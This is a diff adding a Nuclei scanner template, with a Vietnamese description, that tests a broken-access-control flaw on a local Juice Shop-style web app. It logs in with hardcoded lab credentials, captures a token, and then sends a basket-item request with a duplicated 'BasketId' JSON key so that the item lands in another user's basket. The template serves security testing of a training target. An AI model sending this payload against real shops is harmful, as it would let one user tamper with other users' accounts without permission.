@@ -1,0 +1,81 @@
+id: basket-items-auth-flow_broken-access-control
+
+info:
+  name: Basket Items API with Auth Flow
+  author: your_name
+  severity: info
+  description: |
+    Kiểm tra API Basket Items với quá trình đăng nhập để lấy token và sử dụng trong request GET/POST.
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+  - raw:
+      - |
+        GET /rest/basket/6 HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          
+    extractors:
+      - type: regex
+        name: id
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - '"id":\s*(\d+)'
+
+
+  - raw:
+      - |
+        POST /api/BasketItems/ HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+
+        {   
+            "ProductId":1,
+            "BasketId":"{{id}}",
+            "BasketId":"10",
+            "quantity":1
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+              
+      - type: word
+        part: body
+        words:
+          - "SQLITE"
+
+
